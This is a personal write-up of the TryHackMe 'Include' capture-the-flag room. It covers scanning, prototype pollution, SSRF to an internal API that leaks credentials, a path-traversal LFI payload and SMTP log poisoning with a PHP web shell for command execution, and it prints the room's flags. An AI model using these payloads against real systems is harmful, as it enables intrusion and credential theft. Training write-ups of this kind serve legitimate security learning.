@@ -1,0 +1,257 @@
+---------------INCLUDE ROOM TRYHACKME ------------------------
+Date : 03/05/2025
+Ip: 10.10.135.140
+Link : https://tryhackme.com/r/room/include
+Dificulty: Medium
+
+
+Q1: What is the flag value after logging in to the SysMon app?
+
+=====Port scan and enumeration
+
+mapAutomator.sh --host 10.10.135.140 --type All
+
+Running all scans on 10.10.135.140
+
+Host is likely running Unknown OS!
+
+
+---------------------Starting Port Scan-----------------------
+
+
+
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+110/tcp   open  pop3
+143/tcp   open  imap
+993/tcp   open  imaps
+995/tcp   open  pop3s
+4000/tcp  open  remoteanything
+50000/tcp open  ibm-db2 --> http apache2  --> Sysmon app
+
+
+======DIrectory scann on port 50000
+gobuster dir -u http://10.10.135.140:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x .php, .txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.135.140:50000/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              ,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/login.php            (Status: 200) [Size: 2044]
+/templates            (Status: 301) [Size: 327] [--> http://10.10.135.140:50000/templates/]
+/profile.php          (Status: 302) [Size: 0] [--> login.php]
+/.                    (Status: 200) [Size: 1611]
+/uploads              (Status: 301) [Size: 325] [--> http://10.10.135.140:50000/uploads/]
+/.php                 (Status: 403) [Size: 281]
+/index.php            (Status: 200) [Size: 1611]
+/api.php              (Status: 500) [Size: 0]
+/javascript           (Status: 301) [Size: 328] [--> http://10.10.135.140:50000/javascript/]
+/logout.php           (Status: 302) [Size: 0] [--> index.php]
+/auth.php             (Status: 200) [Size: 0]
+/dashboard.php        (Status: 302) [Size: 1225] [--> login.php]
+/phpmyadmin           (Status: 403) [Size: 281]
+
+Now we will try to see if we found something cool on these directories.
+We don't found something cool but we can access to uploads and templates directories. so i will go launch directory enumeration on port 4000 the second app web because i know that there i can login with credentials guest:guest.
+
+
+====Directory enumeration on port 4000
+gobuster dir -u http://10.10.135.140:4000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x .php      
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.135.140:4000/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index                (Status: 302) [Size: 29] [--> /signin]
+/images               (Status: 301) [Size: 179] [--> /images/]
+/signup               (Status: 500) [Size: 1246]
+/Index                (Status: 302) [Size: 29] [--> /signin]
+/signin               (Status: 200) [Size: 1295]
+/fonts                (Status: 301) [Size: 177] [--> /fonts/]
+/INDEX                (Status: 302) [Size: 29] [--> /signin]
+/Signup               (Status: 500) [Size: 1246]
+/SignUp               (Status: 500) [Size: 1246]
+/signUp               (Status: 500) [Size: 1246]
+/SignIn               (Status: 200) [Size: 1295]
+
+
+Nothing cool but we found IDOR (Insecure Direct Object Reference) which allow us to access to another persones areas.
+It have some entries and i think i can use js polution to modify our access into admin.
+I just put in the filded activity isAdmin and in the filed value true and validate. It cnagfe my role in admin : isAdmin: "true" 
+
+When i do it i have access to 2 new directories :
+-api
+-settings
+
+Now i will try to see if i can get something there.
+
+======Api directory investigation
+http://10.10.135.140:4000/admin/api
+API Dashboard
+
+Below is a list of important APIs accessible to admins with sample requests and responses:
+
+    Internal API
+
+    GET http://127.0.0.1:5000/internal-api HTTP/1.1
+    Host: 127.0.0.1:5000
+
+    Response:
+    {
+      "secretKey": "superSecretKey123",
+      "confidentialInfo": "This is very confidential."
+    }
+
+    Get Admins API
+
+    GET http://127.0.0.1:5000/getAllAdmins101099991 HTTP/1.1
+    Host: 127.0.0.1:5000
+
+    Response:
+    {
+        "ReviewAppUsername": "admin",
+        "ReviewAppPassword": "xxxxxx",
+        "SysMonAppUsername": "administrator",
+        "SysMonAppPassword": "xxxxxxxxx",
+    }
+
+
+So i try to connect myself on the sysmon app with username admin and the superkey but nothing
+
+=====Settings directory settings
+http://10.10.135.140:4000/admin/settings
+
+There we can update the banner image url. So i will try to put link to my reverse shell to see the behaiviour
+
+Link : http://10.2.9.70:8000/revshell.php
+When i put it it download the file so i will try to see where it is saved.
+
+After i had idea to put http://127.0.0.1:5000/getAllAdmins101099991 in the filed t see if i will get answer and bim i get domething 
+
+the answer encoded: data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0= 
+
+Decoded: {
+		"ReviewAppUsername":"admin",
+		"ReviewAppPassword":"admin@!!!",
+		"SysMonAppUsername":"administrator",
+		"SysMonAppPassword":"S$9$qk6d#**LQU"
+	}
+
+
+
+I think i have credentienals for the sysmon app .
+
+administrator:S$9$qk6d#**LQU
+
+Flag1 = THM{!50_55Rf_1S_d_k3Y??!}
+
+
+
+------------------------------------------------------------------
+
+Q2: What is the content of the hidden text file in /var/www/html?
+
+I do that i will try to see in direcroties we last found to see if i can found something. 
+
+I try but nothing. I thhink we have to uploas a reverse shell to have access to the system.
+
+When i was inspecting the source code of the dashboard to see how the image in uploads file was called i notice something.
+
+/profile.php?img=profile.png so i just think to lfi . Let us test.
+
+After a long time in my burpsuite i found an lfi 
+
+GET /profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd HTTP/1.1
+Host: 10.10.135.140:50000
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=bp9a7bbs7if8if2rrscioar27i
+Connection: keep-alive
+
+
+
+GET /profile.php?img=....//....//....//....//....//....//....//....//....//var/www/html/index.php HTTP/1.1
+Host: 10.10.135.140:50000
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=bp9a7bbs7if8if2rrscioar27i
+Connection: keep-alive
+
+
+Now i found the lfi but how can i do to have the list of file in /var/www/html
+
+After searching i learned that i can do it with puting my php web shell on the smpt server. 
+
+telnet 10.10.135.140 25
+Trying 10.10.135.140...
+Connected to 10.10.135.140.
+Escape character is '^]'.
+220 mail.filepath.lab ESMTP Postfix (Ubuntu)
+EHLO toto
+250-mail.filepath.lab
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250-DSN
+250-SMTPUTF8
+250 CHUNKING
+mail from <?php echo system($_REQUEST[cmd]); ?>
+501 5.5.4 Syntax: MAIL FROM:<address>
+mail from:'<?php echo system($_REQUEST[cmd]); ?>'@thm.com
+501 5.1.7 Bad sender address syntax
+quit
+Connection closed by foreign host.
+
+http://10.10.135.140:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/mail.log
+
+When i go into mail lig i see that "[10.2.9.70] in MAIL command: ''@thm.com F"
+
+I understund that my shell was registreted as a command so i will try to do ls with &cmd=ls
+
+Request: http://10.10.135.140:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/mail.log&cmd=ls
+
+Answer: ommand: '505eb0fb8a9f32853b4d955e1f9123ea.txt api.php auth.php dashboard.php index.php login.php logout.php profile.php templates upload
+
+Now we have the t.t file name we just have to cat it 
+
+Name: 505eb0fb8a9f32853b4d955e1f9123ea.txt
+
+Request : http://10.10.135.140:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/www/html/505eb0fb8a9f32853b4d955e1f9123ea.txt
+
+Answer: THM{505eb0fb8a9f32853b4d955e1f9123ea}
+
+
+
+
+Thank you for reading my opinion of the room @petstar from togo
